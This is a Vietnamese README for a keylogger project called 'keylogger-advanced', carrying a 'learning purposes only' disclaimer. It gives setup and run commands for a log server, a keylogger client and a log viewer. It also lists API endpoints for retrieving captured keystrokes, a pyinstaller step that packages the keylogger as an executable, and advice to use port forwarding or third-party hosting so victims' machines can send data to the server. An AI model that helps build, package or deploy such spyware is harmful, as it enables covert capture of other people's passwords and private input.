# Keylogger - Nâng cao
### Notice: Tất cả mã nguồn chỉ dùng cho mục đích học tập, vui lòng không sử dụng để tấn công, gây tổn hại đến bất kì cá nhân hay tổ chức nào. Code được sử dụng cho mục đích cá nhân, vui lòng không bán hay có bất kì hoạt động thương mại nào, vui lòng để credit tác giả khi thay đổi, sao chép code. Chúng tôi sẽ không chịu trách nhiệm về mọi hành động của bạn.

## Documentation
### Setup
> git clone https://github.com/MHP0920/keylogger-advanced.git

Truy cập vào folder chứa code đã clone
> pip install -r requirements.txt

### Run
> python logserver\server.py 
_#Dùng để chạy server nhận dữ liệu_

> python clientapp\keylogger.py
_#Dùng để chạy keylogger_

> python owner\handle_logs.py
_#Dùng để logs người dùng nhập từ bàn phím trực tiếp_

### Logs
Truy cập vào api từ server được hiển thị ở debug message khi chạy `server.py`

Ví dụ server: `http://localhost:5000`

API để lấy logs: http://localhost:5000/api/logs

API để lấy raw logs (logs chưa được xử lí): http://localhost:5000/api/rawlogs

### Executeable
> pyinstaller clientapp\keylogger.py
_#pip install pyinstaller_

### Host
Bạn có thể dùng port forwarding để người dùng keylogger có thể connect vào server hoặc dùng chung một mạng (LAN). Bạn có thể dùng bên thứ ba để host code.

### Copyright
_Copyright @ **MHP** 2022. All right reserved._
